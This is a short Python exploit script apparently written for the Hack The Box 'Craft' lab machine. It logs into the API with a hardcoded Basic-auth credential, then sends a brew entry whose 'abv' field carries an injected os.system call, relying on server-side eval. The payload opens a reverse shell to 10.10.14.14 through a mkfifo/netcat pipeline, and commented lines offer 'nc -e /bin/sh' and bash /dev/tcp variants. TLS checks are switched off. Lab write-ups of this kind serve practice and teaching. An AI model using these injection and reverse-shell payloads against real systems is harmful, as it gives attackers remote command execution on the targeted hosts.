import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


res = requests.get(url='https://api.craft.htb/api/auth/login', headers={
    'Accept': 'application/json',
    'Referer': 'https://api.craft.htb/api/',
    'Authorization': 'Basic ZGluZXNoOjRhVWgwQThQYlZKeGdk',
}, verify=False)

api_token = res.json()['token']

print('received api token: %s' % api_token)

# cmd = '__import__("os").system("nc -e /bin/sh 10.10.14.14 6660")'
# cmd = '__import__("os").system("bash -i >& /dev/tcp/10.10.14.14/6660 0>&1")'
# cmd = '__import__("os").system("ping -c 1 10.10.14.14")'
cmd = '__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f")'

res = requests.post(url='https://api.craft.htb/api/brew/', json={
    "brewer": "gato",
    "name": "yoyo",
    "style": "mi vida",
    "abv": cmd,
}, headers={
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Referer': 'https://api.craft.htb/api/',
    'X-Craft-API-Token': api_token,
}, verify=False)

print(res.status_code)
print(res.text)

# eval(cmd)
